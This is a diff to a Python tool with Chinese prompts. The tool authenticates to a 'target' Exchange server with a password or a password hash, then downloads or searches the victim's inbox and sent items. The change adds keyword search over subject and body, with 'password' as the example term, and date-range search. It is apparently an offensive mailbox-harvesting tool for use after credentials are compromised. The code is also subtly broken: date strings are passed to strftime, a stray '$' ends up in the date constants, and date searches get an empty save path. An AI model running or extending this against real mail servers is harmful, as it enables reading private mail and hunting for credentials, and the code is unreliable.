@@ -116,10 +116,64 @@ def save_single_email(session, host, email_id, change_key, save_path):
     email_file = os.path.join(save_path, escape_filename(email_id[-16:] + ".eml"))
     save_email_to_file(email_file, mime_content)
 
-def search_emails(session, host, keyword, folder_path, save_path):
+def search_emails(session, host, folder_path, search_type, keyword, date_from, date_to, save_path):
     """按关键字搜索邮件"""
-    template_file = os.path.join(TEMPLATES_FOLDER, "SearchMailBySubject.xml")
-    soap_body = load_template(template_file, folderpath=folder_path, keyword=escape(keyword))
+    template_file = os.path.join(TEMPLATES_FOLDER, "SearchMail.xml")
+    if search_type == "keyword" and keyword:
+        search_condition = f"""
+                <t:Or>
+                  <t:Contains ContainmentMode="Substring" ContainmentComparison="IgnoreCase">
+                    <t:FieldURI FieldURI="item:Subject" />
+                    <t:Constant Value="{escape(keyword)}" />
+                  </t:Contains>
+                  <t:Contains ContainmentMode="Substring" ContainmentComparison="IgnoreCase">
+                    <t:FieldURI FieldURI="item:Body" />
+                    <t:Constant Value="{escape(keyword)}" />
+                  </t:Contains>
+                </t:Or>
+            """
+    elif search_type == "DateTimeReceived" and date_from and date_to:
+        start_date_str = date_from.strftime('%Y-%m-%dT%H:%M:%SZ')
+        end_date_str = date_to.strftime('%Y-%m-%dT%H:%M:%SZ')
+        search_condition = f"""
+                <t:And>
+                  <t:IsGreaterThanOrEqualTo>
+                      <t:FieldURI FieldURI="item:DateTimeReceived" />
+                      <t:FieldURIOrConstant>
+                        <t:Constant Value="${start_date_str}" />
+                      </t:FieldURIOrConstant>
+                    </t:IsGreaterThanOrEqualTo>
+                  <t:IsLessThanOrEqualTo>
+                      <t:FieldURI FieldURI="item:DateTimeReceived" />
+                      <t:FieldURIOrConstant>
+                        <t:Constant Value="${end_date_str}" />
+                      </t:FieldURIOrConstant>
+                  </t:IsLessThanOrEqualTo>
+                </t:And>
+            """
+    elif search_type == "DateTimeSent" and date_from and date_to:
+        start_date_str = date_from.strftime('%Y-%m-%dT%H:%M:%SZ')
+        end_date_str = date_to.strftime('%Y-%m-%dT%H:%M:%SZ')
+        search_condition = f"""
+                <t:And>
+                  <t:IsGreaterThanOrEqualTo>
+                      <t:FieldURI FieldURI="item:DateTimeSent" />
+                      <t:FieldURIOrConstant>
+                        <t:Constant Value="${start_date_str}" />
+                      </t:FieldURIOrConstant>
+                    </t:IsGreaterThanOrEqualTo>
+                  <t:IsLessThanOrEqualTo>
+                      <t:FieldURI FieldURI="item:DateTimeSent" />
+                      <t:FieldURIOrConstant>
+                        <t:Constant Value="${end_date_str}" />
+                      </t:FieldURIOrConstant>
+                  </t:IsLessThanOrEqualTo>
+                </t:And>
+            """
+    else:
+        raise ValueError("Invalid search_type or missing date range for 'date' search")
+
+    soap_body = load_template(template_file, folderpath=folder_path, search_condition=search_condition)
     response = send_soap_request(session, host, soap_body)
 
     root = ET.fromstring(response.content)
@@ -132,7 +186,7 @@ def main():
     parser.add_argument("--host", required=True, help="目标Exchange服务器")
     # parser.add_argument("--mode", required=True, choices=["plaintext", "hash"], help="认证模式")
     parser.add_argument("--username", required=True, help="用户名")
-    parser.add_argument("--password", required=False, help="哈希")
+    parser.add_argument("--password", required=False, help="明文密码")
     parser.add_argument("--hash", required=False, help="哈希")
     parser.add_argument("--command", required=True, choices=["download", "people", "search"], help="命令")
     parser.add_argument("--proxy", help="HTTP代理")
@@ -172,17 +226,24 @@ def main():
             # 打印总数量
             logging.info(f"共计 {total_count} 个结果已写入文件 emails.txt")
     elif args.command == "download":
-
         logging.info("可用的文件夹如下：inbox, sentitems")
-
         folder = input("请输入文件夹名称: ")
         save_path = os.path.join(os.getcwd(), args.username, folder)
         download_email(session, args.host, folder, save_path)
     elif args.command == "search":
-        keyword = input("请输入搜索关键词: ")
-        save_path = os.path.join(os.getcwd(), args.username, f"Search-{escape_filename(keyword)}")
-        search_emails(session, args.host, keyword, "inbox", os.path.join(save_path, "inbox"))
-        search_emails(session, args.host, keyword, "sentitems", os.path.join(save_path, "sentitems"))
+        search_type = input("请输入搜索类型, 比如keyword, DateTimeReceived, DateTimeSent: ")
+        keyword, date_from, date_to, save_path = "","","",""
+        if search_type == "keyword":
+            keyword = input("请输入搜索关键词, 比如password: ")
+            save_path = os.path.join(os.getcwd(), args.username, f"Search-{escape_filename(keyword)}")
+        elif search_type == "DateTimeReceived":
+            date_from = input("请输入收件起始日期, 比如 2024-01-01: ")
+            date_to = input("请输入收件截止日期, 比如 2024-01-01: ")
+        elif search_type == "DateTimeSent":
+            date_from = input("请输入发件起始日期, 比如 2024-01-01: ")
+            date_to = input("请输入发件截止日期, 比如 2024-01-01: ")
+        for folder in ['inbox', 'sentitems']:
+            search_emails(session, args.host, folder, search_type, keyword, date_from, date_to, os.path.join(save_path, folder))
 
 if __name__ == "__main__":
     main()
